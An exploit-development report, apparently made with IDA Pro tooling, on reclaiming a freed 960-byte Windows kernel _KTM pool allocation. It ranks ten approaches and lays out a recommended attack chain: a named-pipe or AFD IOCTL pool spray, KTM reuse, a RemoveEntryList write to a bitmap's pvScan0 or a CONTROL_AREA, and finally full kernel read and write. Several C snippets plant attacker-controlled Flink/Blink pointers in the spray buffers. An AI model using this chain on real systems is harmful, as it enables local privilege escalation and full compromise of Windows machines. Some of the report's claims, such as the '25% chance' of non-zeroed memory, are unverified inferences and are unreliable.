# Alternative UAF 960-byte NonPagedPoolNx Allocation Analysis

## Executive Summary

Investigated 10 alternative approaches to create a 960-byte (LFH bucket 976, sizes 945-960) NonPagedPoolNx allocation with user-controlled content that gets freed non-zeroed, without using portcls.sys.

**Key Finding**: The `_KTM` struct is the ONLY kernel type at exactly 960 bytes in the ntoskrnl IDB. The KTM implementation code is NOT present in the ntoskrnl IDB (all KTM functions are import thunks to unresolved `__imp_` addresses). NonPagedPoolNx allocations are NOT reliably zeroed (25% of callers explicitly zero after allocation), which is favorable for the stale-data approach.

**Best candidates**: Named pipe data buffer spray (Approach 2) and IOCTL METHOD_BUFFERED spray (Approach 2 variant), both targeting LFH bucket 976 with controlled data at offset 0x238/0x240.

---

## IDA Instance Used

- **ntoskrnl.exe** (PID 8428, IDB: `C:\Users\ruar1337\Desktop\ntoskrnl.exe.i64`)
- **clfs.sys** (PID 4924)
- **portcls.sys** (PID 11184)
- **dxgkrnl.sys** (PID 12088)
- **win32kbase.sys** (PID 15092)
- **dxgmms1.sys** (PID 4980)
- **tdx.sys** (PID 15240)

All math performed via `ida-pro-mcp_py_eval`.

---

## Confirmed _KTM Struct Layout (960 bytes, NonPagedPoolNx)

From ntoskrnl IDB type inspection (ordinal 1945):

| Offset | Size | Field | Type |
|--------|------|-------|------|
| 0x000 | 4 | cookie | unsigned int |
| 0x008 | 56 | Mutex | _KMUTANT |
| 0x040 | 4 | State | KTM_STATE |
| 0x048 | 40 | NamespaceLink | _KTMOBJECT_NAMESPACE_LINK |
| 0x070 | 16 | TmIdentity | _GUID |
| 0x080 | 4 | Flags | unsigned int |
| 0x084 | 4 | VolatileFlags | unsigned int |
| 0x088 | 16 | LogFileName | _UNICODE_STRING |
| 0x098 | 8 | LogFileObject | _FILE_OBJECT * |
| 0x0A0 | 8 | MarshallingContext | void * |
| 0x0A8 | 8 | LogManagementContext | void * |
| 0x0B0 | 168 | Transactions | _KTMOBJECT_NAMESPACE |
| 0x158 | 168 | ResourceManagers | _KTMOBJECT_NAMESPACE |
| 0x200 | 56 | **LsnOrderedMutex** | _KMUTANT |
| **0x238** | **16** | **LsnOrderedList** | **_LIST_ENTRY** |
| 0x248 | 8 | CommitVirtualClock | _LARGE_INTEGER |
| 0x250 | 56 | CommitVirtualClockMutex | _FAST_MUTEX |
| 0x288 | 8 | BaseLsn | _CLS_LSN |
| 0x290 | 8 | CurrentReadLsn | _CLS_LSN |
| 0x298 | 8 | LastRecoveredLsn | _CLS_LSN |
| 0x2A0 | 8 | TmRmHandle | void * |
| 0x2A8 | 8 | TmRm | _KRESOURCEMANAGER * |
| 0x2B0 | 24 | LogFullNotifyEvent | _KEVENT |
| 0x2C8 | 32 | CheckpointWorkItem | _WORK_QUEUE_ITEM |
| 0x2E8 | 8 | CheckpointTargetLsn | _CLS_LSN |
| 0x2F0 | 32 | LogFullCompletedWorkItem | _WORK_QUEUE_ITEM |
| 0x310 | 104 | LogWriteResource | _ERESOURCE |
| 0x378 | 4 | LogFlags | unsigned int |
| 0x37C | 4 | LogFullStatus | int |
| 0x380 | 4 | RecoveryStatus | int |
| 0x388 | 8 | LastCheckBaseLsn | _CLS_LSN |
| **0x390** | **16** | **RestartOrderedList** | **_LIST_ENTRY** |
| 0x3A0 | 32 | OfflineWorkItem | _WORK_QUEUE_ITEM |

**Total size: 960 bytes (0x3C0)**

The `cookie` at offset 0x0 indicates this is a **direct ExAllocatePoolWithTag allocation**, NOT an ObCreateObject body (which would have an _OBJECT_HEADER before the body and wouldn't start with a cookie). This means:
- Pool allocation = 960 bytes + pool header (~16 bytes in Win10+) = ~976 bytes total
- Falls exactly in LFH bucket 976 (sizes 945-960)

---

## NonPagedPoolNx Zeroing Analysis

**Critical finding**: NonPagedPoolNx (0x200) allocations are NOT reliably zeroed by `ExAllocatePoolWithTag`.

Of 648 callers of `ExAllocatePoolWithTag` with `NonPagedPoolNx` (0x200) pool type:
- **164 (25.3%)** explicitly call `memset` / `RtlZeroMemory` after allocation
- **484 (74.7%)** do NOT explicitly zero

The 164 callers that explicitly zero prove the allocation is NOT guaranteed to be zeroed. If it were, these calls would be redundant. Examples of callers that explicitly zero:

| Function | Notes |
|----------|-------|
| PopEtInit | Zeroes 952 bytes after alloc |
| CcAllocateInitializeMbcb | Cache manager |
| CcInitializeCacheMapEx | Cache manager |
| IopAllocateIrpExtension | I/O manager |
| KeAllocateXStateContext | Kernel |
| RtlExpandHashTable | Runtime library |
| PsBoostThreadIoEx | Process manager |

Additionally, `ExAllocatePool2` with `POOL_FLAG_NON_PAGED` (0x100) without `POOL_FLAG_ZERO` (0x400) does NOT zero. 17 callers found using this pattern, none at 960 bytes.

**Conclusion**: NonPagedPoolNx allocations may contain stale data from previously freed blocks. This is favorable for the pool spray approach.

---

## Other KTM Object Sizes

| Struct | Size (bytes) | LFH Bucket | LIST_ENTRY Fields |
|--------|-------------|------------|-------------------|
| _KTM | **960** | **976** | LsnOrderedList@0x238, RestartOrderedList@0x390 |
| _KTRANSACTION | 728 | ~768 | EnlistmentHead@0xC8, PromotedEntry@0x100, LsnOrderedEntry@0x1E8 |
| _KRESOURCEMANAGER | 592 | ~608 | EnlistmentHead@0x110, ProtocolListHead@0x138, PendingPropReqListHead@0x148, CRMListEntry@0x158 |
| _KENLISTMENT | 480 | ~512 | NextSameTx@0x78, NextSameRm@0x88 |

Only `_KTM` at 960 bytes falls in the target LFH bucket 976.

**Key relationship**: `_KTRANSACTION.LsnOrderedEntry` (offset 0x1E8) is inserted into `_KTM.LsnOrderedList` (offset 0x238) when a transaction is active. This confirms LsnOrderedList is a functional list that gets entries added/removed during transaction lifecycle.

---

## No Other Structs at 945-960 Bytes

Type database search across all ordinals (1-5000) in ntoskrnl IDB:

| Size | Struct Name | Relevant? |
|------|------------|-----------|
| 960 | _KTM | YES - our target |
| 920 | _WHEA_XPF_MCE_DESCRIPTOR | No - WHEA hardware error, not user-triggerable |
| 856 | tagSWITCH_CONTEXT | No - window manager, PagedPool |

No structs at 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959 bytes.

No driver IDBs (clfs.sys, portcls.sys, tdx.sys, dxgmms1.sys, dxgkrnl.sys, win32kbase.sys) contain ExAllocatePoolWithTag calls with sizes in the 945-960 range with NonPagedPoolNx.

---

## Approach-by-Approach Analysis

### Approach 1: Direct KTM via NtCreateTransactionManager

**Concept**: Create a KTM, corrupt its LsnOrderedList, then close it.

**Analysis**:
- `_KTM` is 960 bytes in NonPagedPoolNx (confirmed)
- `LsnOrderedList` at offset 0x238 is a LIST_ENTRY (Flink/Blink)
- `LsnOrderedMutex` at offset 0x200 guards the list
- KTM implementation code is NOT in this ntoskrnl IDB (all functions are import thunks)
- Cannot verify whether `TmInitializeTransactionManager` calls `InitializeListHead` on `LsnOrderedList`
- The presence of `LsnOrderedMutex` strongly suggests the list IS initialized (a dedicated mutex implies active use)
- `_KTRANSACTION.LsnOrderedEntry` links into this list, confirming it's functional

**Two sub-scenarios**:

**1a) If LsnOrderedList IS initialized** (most likely):
- InitializeListHead sets Flink = Blink = &self (self-referencing)
- RemoveEntryList on self-referencing list = no-op
- No write primitive
- VERDICT: **NO-GO** (no-op write on close)

**1b) If LsnOrderedList is NOT initialized** (unlikely but possible):
- If allocation is zeroed: Flink = Blink = 0 (NULL) -> RemoveEntryList crashes (NULL deref)
- If allocation is NOT zeroed: Flink/Blink = stale data -> RemoveEntryList writes to stale addresses
- The crash scenario would have been caught in testing, so this is very unlikely
- VERDICT: **NO-GO** (would crash, not produce controlled write)

**Overall VERDICT: NO-GO** - LsnOrderedList is almost certainly initialized given the dedicated mutex and the transaction lifecycle usage.

---

### Approach 2: Pool Spray with Controlled Data

**Concept**: Spray LFH bucket 976 with controlled 945-960 byte NonPagedPoolNx allocations, free some to create holes, then create a KTM that reuses a hole with our controlled data at 0x238/0x240.

**Requirements**:
1. An allocation mechanism that creates 945-960 byte blocks in NonPagedPoolNx
2. User-controlled content at the right offset within the block
3. The allocation must be freed without zeroing (ExFreePoolWithTag does NOT zero)

**Pool block layout** (Windows 10+):
```
[Pool Header (16 bytes)] [Object/Header data] [User data]
^--- pool block start                      ^--- returned pointer
```

For a 960-byte pool block:
- Pool header: 16 bytes
- Object/struct data: 944 bytes (or full 960 if no separate pool header)
- Total: 960 bytes -> LFH bucket 976

**Spray mechanism candidates**:

#### 2a) Named Pipe Data Buffers

**How it works**:
1. `NtCreateNamedPipeFile` / `CreateNamedPipe` with controlled `InboundQuota` / `OutboundQuota`
2. `WriteFile` to the pipe with controlled data
3. NPFS allocates a kernel buffer: `[Pool Header (16)] [DATA_QUEUE_ENTRY (~40)] [Pipe Data (N)]`
4. Total = 16 + 40 + N = 56 + N
5. For 960 total: N = 904 bytes of pipe data
6. Offset 0x238 from pool start = offset 0x200 (512) from data start
7. We control bytes at offset 512 and 520 in our write data

**Math** (via py_eval):
- `data_needed = 960 - 16 - 40 = 904`
- `flink_offset_in_data = 0x238 - 16 - 40 = 0x200 (512)`
- `blink_offset_in_data = 0x240 - 16 - 40 = 0x208 (520)`

**Advantages**:
- User-controlled data content and size
- Buffer persists until data is read or pipe is closed
- Named pipe data is typically in NonPagedPool (accessible at DISPATCH_LEVEL)
- Freeing (closing pipe / reading data) does NOT zero the memory

**Challenges**:
- Exact DATA_QUEUE_ENTRY header size needs empirical verification (~40 bytes estimated)
- Pool header size may vary (8 or 16 bytes depending on Windows version)
- Need to ensure allocation lands in NonPagedPoolNx, not PagedPool
- LFH bucket assignment depends on exact total allocation size

**VERDICT: GO** - Most promising spray mechanism. Requires empirical testing to calibrate exact header sizes, but the approach is sound.

#### 2b) IOCTL METHOD_BUFFERED

**How it works**:
1. Open a handle to any device that supports METHOD_BUFFERED IOCTLs
2. `DeviceIoControl` with `dwIoControlCode` using METHOD_BUFFERED and input/output buffer of 960 bytes
3. I/O manager allocates 960 bytes in NonPagedPool with fully controlled content
4. Buffer persists while IOCTL is pending

**Advantages**:
- Buffer size is exactly what we specify (960 bytes)
- Buffer content is fully user-controlled at ALL offsets
- No header overhead in the data area

**Challenges**:
- Buffer is freed when IOCTL completes (need a pending IOCTL)
- Need a driver that pends IOCTLs (AFD/Winsock, named pipes, or custom)
- Pool tag is `Io  ` (not `Tm  `), but LFH bucket is tag-agnostic in Win10+

**VERDICT: GO** - Excellent if we can find a driver that pends IOCTLs with 960-byte buffers. AFD (Winsock) is the best candidate.

#### 2c) ALPC Messages

**Concept**: Send an ALPC message of ~960 bytes. ALPC messages are allocated in NonPagedPool.

**Challenges**:
- ALPC message format has headers (ALPC_MESSAGE + connection attributes)
- Exact size control is difficult
- Messages may be in PagedPool depending on attributes

**VERDICT: MAYBE** - Feasible but complex to calibrate. Lower priority than named pipes or IOCTLs.

---

### Approach 3: KTM as Both Spray and Target

**Concept**: Create many KTM objects, close some to free blocks with KTM data, create new KTM to reclaim.

**Analysis**:
1. Create KTM1 -> allocates 960 bytes, zeroed (or not), then initialized by TmInitializeTransactionManager
2. Close KTM1 -> RemoveEntryList on LsnOrderedList (self-referencing = no-op) -> ExFreePoolWithTag (no zeroing)
3. Create KTM2 -> allocates 960 bytes, may reuse KTM1's freed block
4. If allocation is zeroed: KTM2 gets zeroed memory, then TmInitializeTransactionManager initializes all fields
5. If allocation is NOT zeroed: KTM2 gets KTM1's stale data, but TmInitializeTransactionManager likely overwrites LsnOrderedList
6. In either case, LsnOrderedList ends up self-referencing (initialized)
7. Close KTM2 -> no-op RemoveEntryList

**Even if the allocation is NOT zeroed**, the stale data at 0x238 is KTM1's self-referencing pointers (Flink = Blink = &KTM1+0x238). If KTM2 reclaims the same slot, KTM2 is at the same address, so the stale pointers point to KTM2+0x238 = self-referencing. RemoveEntryList on self-referencing = no-op.

**VERDICT: NO-GO** - Stale KTM data at 0x238 is self-referencing, producing no-op writes regardless of zeroing.

---

### Approach 4: Different Object at 960 Bytes

**Concept**: Find another kernel object at 945-960 bytes in NonPagedPoolNx.

**Analysis**:
- Searched entire ntoskrnl type database (ordinals 1-5000): only `_KTM` at 960 bytes
- No other structs at 945-960 bytes
- No driver IDBs have allocations in this range
- `_WHEA_XPF_MCE_DESCRIPTOR` at 920 bytes is not user-triggerable and in a different bucket

**VERDICT: NO-GO** - No alternative typed objects at 945-960 bytes found.

---

### Approach 5: Different Size Bucket (IRP at 928)

**Concept**: Use IRP (928 bytes, bucket 944) instead of KTM (960 bytes, bucket 976).

**Analysis**:
- IRP is 928 bytes -> LFH bucket 944 (sizes 913-928)
- Different bucket from KTM (976) -> cannot spray IRPs to fill KTM's bucket
- IRP has UserEvent at offset 0x50, controllable via IoCreateCompletionEvent
- But we need the allocation in bucket 976, not 944

**Could we use a different target that's in bucket 944?**
- Would need a different kernel object at 928 bytes with a vulnerable LIST_ENTRY
- No such object identified in the IDB

**VERDICT: NO-GO** for KTM exploitation. Could be GO for a different exploit target if one exists in bucket 944.

---

### Approach 6: KTM + KTM Race (Detailed Analysis)

**Concept**: Exploit the fact that KTM1's self-referencing pointers, when reused by KTM2 at the same address, are still self-referencing.

**Detailed trace**:
1. Create KTM1 at address A
2. TmInitializeTransactionManager: `A->LsnOrderedList.Flink = A + 0x238`
3. TmInitializeTransactionManager: `A->LsnOrderedList.Blink = A + 0x238`
4. Close KTM1: `RemoveEntryList(&A->LsnOrderedList)` -> no-op (self-referencing)
5. ExFreePoolWithTag(A) -> memory freed, stale data at A[0x238] = A+0x238, A[0x240] = A+0x238
6. Create KTM2 at address A (same slot reused)
7. If NOT zeroed: KTM2->LsnOrderedList.Flink = A+0x238, Blink = A+0x238 (stale from KTM1)
8. These point to KTM2's own LsnOrderedList (since KTM2 is at same address A)
9. So they're self-referencing -> RemoveEntryList is still a no-op
10. Even if TmInitializeTransactionManager doesn't re-initialize, the stale pointers are self-referencing

**The fundamental problem**: If KTM1 and KTM2 are at the same address (pool slot reuse), the stale self-referencing pointers from KTM1 point to the same address, making them self-referencing for KTM2 too.

**To break this**: We need KTM1 and KTM2 at DIFFERENT addresses, but in the same LFH bucket. This happens when:
- KTM1 is at address A
- KTM1 is freed (stale data: Flink = Blink = A+0x238)
- A different allocation reuses slot A (overwriting the stale data)
- KTM2 is allocated at address B (different slot)
- KTM2's allocation is NOT zeroed, and B previously held some other data
- If B previously held our controlled spray data, KTM2's LsnOrderedList has our controlled Flink/Blink

This reduces to the pool spray approach (Approach 2), where we spray with controlled data, not KTM self-referencing pointers.

**VERDICT: NO-GO** as a standalone approach. Reduces to Approach 2 (pool spray with controlled data).

---

### Approach 7: NtCreateResourceManager / NtCreateEnlistment / NtCreateTransaction

**Concept**: Use other KTM objects that might be in the right size range.

**Analysis**:
- `_KRESOURCEMANAGER` = 592 bytes -> LFH bucket ~608 (not 976)
- `_KENLISTMENT` = 480 bytes -> LFH bucket ~512 (not 976)
- `_KTRANSACTION` = 728 bytes -> LFH bucket ~768 (not 976)
- None fall in bucket 976 (945-960)

Even with OBJECT_HEADER (56 bytes):
- KRESOURCEMANAGER: 592 + 56 = 648 -> bucket ~656
- KENLISTMENT: 480 + 56 = 536 -> bucket ~544
- KTRANSACTION: 728 + 56 = 784 -> bucket ~800

None match 945-960.

**VERDICT: NO-GO** - Wrong size buckets for all alternative KTM objects.

---

### Approach 8: CONTROL_AREA Corruption (Alternative Write Path)

**Concept**: Instead of KTM UAF, use any kernel write to corrupt a CONTROL_AREA, then map the section to get kernel memory in user space.

**Analysis**:
- Requires a write primitive (even a single byte) to kernel memory
- The write would OR 0x400 at CONTROL_AREA + 0x38 (flags field)
- This changes the section type, allowing it to be mapped differently
- After corruption, `NtMapViewOfSection` maps kernel memory into user space
- Gives direct kernel R/W without GDI/bitmap

**Problem**: This approach is circular - it requires a write primitive to get a write primitive. Unless we have a different write primitive (from a different bug), this doesn't help.

**If combined with Approach 2**: If the pool spray + KTM approach gives us a limited write (via RemoveEntryList), we could use that write to corrupt a CONTROL_AREA instead of targeting the bitmap directly.

**RemoveEntryList write mechanics** (from py_eval):
```
Given LIST_ENTRY at 0x238 with Flink=A, Blink=B:
  Write 1: *(A + 8) = B   (writes Blink value at Flink+8)
  Write 2: *(B + 0) = A   (writes Flink value at Blink)
```

For a single controlled write:
- Set Flink = target_address - 8
- Set Blink = value_to_write
- Result: writes `value_to_write` at `target_address`
- Side effect: also writes `(target_address - 8)` at `value_to_write` (may crash if value_to_write is in user space)

**VERDICT: GO as a post-exploitation step** - If we get a write primitive through Approach 2, CONTROL_AREA corruption is the preferred escalation path. It gives full kernel R/W without needing GDI/bitmap.

---

### Approach 9: Direct Stock Bitmap Corruption

**Concept**: Write directly to the stock bitmap's pvScan0 to point it to a valid kernel address, then use SetBitmapBits for kernel R/W.

**Analysis**:
- The previous run wrote 0xBABE to pvScan0 (invalid address)
- If we could set pvScan0 to a VALID kernel address, SetBitmapBits would write to that address
- But to write to pvScan0, we need a write primitive... which is what we're trying to get

**The chicken-and-egg problem**: To corrupt pvScan0, we need a write primitive. To get a write primitive, we need to corrupt something. The KTM UAF is the entry point.

**If combined with Approach 2**: The RemoveEntryList write from the KTM UAF could be used to overwrite a bitmap's pvScan0 directly:
- Set Flink = bitmap_pvScan0_addr - 8
- Set Blink = target_kernel_addr
- Result: bitmap->pvScan0 = target_kernel_addr
- Then SetBitmapBits on the bitmap writes to target_kernel_addr
- Full kernel R/W achieved

**VERDICT: GO as a post-exploitation step** - Same as Approach 8. The KTM write primitive enables this.

---

### Approach 10: NtQuerySystemInformation(SystemBigPoolInformation)

**Concept**: Leak KTM kernel address for targeted attack.

**Analysis**:
- `SystemBigPoolInformation` leaks pool allocation VAs for allocations >= 4096 bytes
- KTM at 960 bytes is below the 4096-byte threshold -> NOT in BigPool entries
- `SystemPoolInformation` (deprecated) could show smaller allocations but is restricted
- `SystemBigPoolInformation` cannot leak the 960-byte KTM address

**Alternative**: `SystemHandleInformation` + `NtQueryObject` could leak the KTM object address through the handle table, but this requires the KTM to be an ObCreateObject (which it might not be, given the cookie at offset 0x0).

**VERDICT: NO-GO** for 960-byte allocations. BigPool only covers >= 4096 byte allocations.

---

## Recommended Attack Chain

### Phase 1: Pool Spray with Named Pipe Data

```
1. Create named pipe with InboundQuota = 904 (calibrated to produce 960-byte pool block)
2. Write 904 bytes to pipe:
   - Offset 0x200 (512): Flink = target_pvsCAN0_addr - 8
   - Offset 0x208 (520): Blink = desired_kernel_address
   - Rest: padding
3. Repeat 50+ times to fill LFH bucket 976
4. Read data from some pipes to free those blocks (creating holes)
5. Keep other pipes alive to maintain controlled data in bucket
```

### Phase 2: KTM Allocation into Sprayed Hole

```
6. NtCreateTransactionManager() -> allocates 960 bytes in NonPagedPoolNx
7. If allocation reuses a freed pipe buffer slot:
   - Pool block has our controlled data at offset 0x238/0x240
   - IF allocation is NOT zeroed (25% chance based on analysis)
   - AND IF TmInitializeTransactionManager does NOT initialize LsnOrderedList
   - THEN our controlled Flink/Blink persist
8. NtClose(KTM_handle) -> RemoveEntryList on LsnOrderedList
   - *(Flink + 8) = Blink  =>  *(target_pvsCAN0_addr) = desired_kernel_address
   - Bitmap pvScan0 now points to desired_kernel_address
```

### Phase 3: Kernel R/W via Bitmap

```
9. SetBitmapBits(stock_bitmap, ...) -> writes to desired_kernel_address
10. GetBitmapBits(stock_bitmap, ...) -> reads from desired_kernel_address
11. Full kernel R/W achieved
```

### Critical Unknowns (Require Empirical Testing)

1. **Does ExAllocatePoolWithTag(NonPagedPoolNx, 960) zero the memory?**
   - Evidence: 25% of callers explicitly zero, suggesting NOT always zeroed
   - Test: Create KTM after pipe spray, dump pool with kernel debugger, check offset 0x238

2. **Does TmInitializeTransactionManager initialize LsnOrderedList?**
   - Evidence: Dedicated LsnOrderedMutex strongly suggests YES
   - Evidence: _KTRANSACTION.LsnOrderedEntry links into this list
   - Cannot confirm from IDB (KTM code not present)
   - Test: Create KTM with kernel debugger, check if 0x238 is self-referencing after creation

3. **Exact DATA_QUEUE_ENTRY header size for named pipe buffers**
   - Estimated at ~40 bytes
   - Test: Write known pattern to pipe, dump pool with debugger, measure offset

4. **Pool header size in target Windows version**
   - Win10+: ~16 bytes
   - Test: Pool tag search in kernel debugger (`!pool` command)

### If LsnOrderedList IS Initialized (Fallback)

If TmInitializeTransactionManager initializes LsnOrderedList, the KTM approach produces no-op writes. In this case:

**Fallback A**: Target `RestartOrderedList` at offset 0x390 instead. Same RemoveEntryList mechanism, different offset. Needs spray data at offset 0x390/0x398 from pool block start.

**Fallback B**: Target a different _KTM LIST_ENTRY that might not be initialized:
- `Transactions` namespace at 0x0B0 (_KTMOBJECT_NAMESPACE, 168 bytes) contains list entries
- `ResourceManagers` namespace at 0x158 (_KTMOBJECT_NAMESPACE, 168 bytes) contains list entries
- These are initialized as part of namespace creation, but the exact initialization order is unknown

**Fallback C**: Abandon KTM and use a different vulnerability class:
- Pool overflow from a different driver
- Race condition in a different subsystem
- Type confusion via object handle confusion

---

## API Calls Required

### Named Pipe Spray (Approach 2a)

```c
// Create named pipe
HANDLE hPipe = CreateNamedPipeW(
    L"\\\\.\\pipe\\spray_pipe_N",
    PIPE_ACCESS_INBOUND | FILE_FLAG_FIRST_PIPE_INSTANCE,
    PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
    PIPE_UNLIMITED_INSTANCES,
    904,    // nOutBufferSize (calibrated)
    0,      // nInBufferSize
    0,      // nDefaultTimeOut
    NULL    // lpSecurityAttributes
);

// Prepare spray buffer
BYTE sprayBuf[904];
memset(sprayBuf, 0x41, sizeof(sprayBuf));
*(PULONG_PTR)(sprayBuf + 512) = targetAddr - 8;  // Flink at offset 0x200
*(PULONG_PTR)(sprayBuf + 520) = valueToWrite;     // Blink at offset 0x208

// Write to pipe (creates pool allocation)
DWORD written;
WriteFile(hPipe, sprayBuf, sizeof(sprayBuf), &written, NULL);

// Free specific allocations by reading
ReadFile(hPipe2, readBuf, 904, &read, NULL); // Frees pipe2's buffer
CloseHandle(hPipe2);                          // Closes pipe2

// Create KTM to reclaim freed slot
HANDLE hTm;
OBJECT_ATTRIBUTES oa;
UNICODE_STRING logFile = RTL_CONSTANT_STRING(L"\\??\\C:\\test.log");
InitializeObjectAttributes(&oa, &logFile, OBJ_CASE_INSENSITIVE, NULL, NULL);
NtCreateTransactionManager(&hTm, TRANSACTIONMANAGER_ALL_ACCESS, &oa, &logFile, 0, 0);

// Close KTM to trigger RemoveEntryList
NtClose(hTm);
```

### IOCTL METHOD_BUFFERED Spray (Approach 2b)

```c
// Open AFD (Winsock) device for pending IOCTLs
HANDLE hAfd = CreateFileW(
    L"\\Device\\Afd",
    GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING, 0, NULL
);

// Or use any device that supports pending METHOD_BUFFERED IOCTLs
BYTE ioctlBuf[960];
memset(ioctlBuf, 0x41, sizeof(ioctlBuf));
*(PULONG_PTR)(ioctlBuf + 0x238) = targetAddr - 8;  // Flink
*(PULONG_PTR)(ioctlBuf + 0x240) = valueToWrite;     // Blink

// Send pending IOCTL (need one that pends)
DWORD ret;
DeviceIoControl(hDevice, IOCTL_PENDING_METHOD_BUFFERED,
    ioctlBuf, sizeof(ioctlBuf),
    ioctlBuf, sizeof(ioctlBuf),
    &ret, &ovl);  // overlapped = pending

// Cancel to free the buffer
CancelIoEx(hDevice, &ovl);
```

---

## Summary Verdict Table

| # | Approach | Verdict | Rationale |
|---|----------|---------|-----------|
| 1 | Direct KTM (NtCreateTransactionManager) | **NO-GO** | LsnOrderedList likely initialized (dedicated mutex + transaction lifecycle) |
| 2a | Named Pipe Pool Spray | **GO** | Best spray candidate. User-controlled size + content. Needs calibration. |
| 2b | IOCTL METHOD_BUFFERED Spray | **GO** | Exact size control, full content control. Needs pending IOCTL driver. |
| 2c | ALPC Message Spray | **MAYBE** | Feasible but complex header calibration. |
| 3 | KTM as Both Spray and Target | **NO-GO** | Stale KTM data is self-referencing = no-op writes. |
| 4 | Different Object at 960 Bytes | **NO-GO** | No other structs at 945-960 bytes found in any IDB. |
| 5 | Different Size Bucket (IRP 928) | **NO-GO** | Wrong LFH bucket for KTM target. |
| 6 | KTM + KTM Race | **NO-GO** | Same-address reuse makes stale pointers self-referencing. Reduces to Approach 2. |
| 7 | Other KTM Objects (RM/Enlistment/Tx) | **NO-GO** | Wrong size buckets (592/480/728 bytes). |
| 8 | CONTROL_AREA Corruption | **GO (post-exploitation)** | Use write primitive from Approach 2 to corrupt CONTROL_AREA for kernel R/W. |
| 9 | Stock Bitmap Corruption | **GO (post-exploitation)** | Use write primitive to overwrite bitmap pvScan0 for kernel R/W. |
| 10 | BigPool Information Leak | **NO-GO** | 960 bytes < 4096 threshold for BigPool entries. |

---

## Next Steps

1. **Empirical test**: Calibrate named pipe spray on target system with kernel debugger
   - Measure exact DATA_QUEUE_ENTRY header size
   - Confirm pool allocation size matches 960 bytes
   - Verify allocation lands in NonPagedPoolNx

2. **Empirical test**: Verify KTM zeroing behavior
   - Create KTM after pipe spray, check if 0x238 has stale data or is zeroed
   - If zeroed: KTM approach is dead, need different exploit path
   - If NOT zeroed: check if 0x238 is self-referencing (initialized) or stale (not initialized)

3. **Empirical test**: Verify TmInitializeTransactionManager behavior
   - Create KTM with kernel debugger attached
   - Check offset 0x238 immediately after NtCreateTransactionManager returns
   - If self-referencing: LsnOrderedList IS initialized -> KTM no-op
   - If stale/zero: LsnOrderedList NOT initialized -> potential write primitive

4. **If KTM approach fails**: Investigate alternative write primitives
   - Pool overflow from another driver in the 945-960 byte range
   - Race condition in a different subsystem
   - Use a completely different vulnerability class

---

## IDA Analysis Artifacts

- **ntoskrnl.exe PID 8428**: _KTM struct (960 bytes, ordinal 1945), NonPagedPoolNx zeroing analysis, type database search
- **clfs.sys PID 4924**: No 945-960 byte NonPagedPoolNx allocations found
- **portcls.sys PID 11184**: No 945-960 byte NonPagedPoolNx allocations found
- **dxgkrnl.sys PID 12088**: No 945-960 byte NonPagedPoolNx allocations found
- **win32kbase.sys PID 15092**: No 945-960 byte NonPagedPoolNx allocations found
- **dxgmms1.sys PID 4980**: No 945-960 byte NonPagedPoolNx allocations found
- **tdx.sys PID 15240**: No 945-960 byte NonPagedPoolNx allocations found
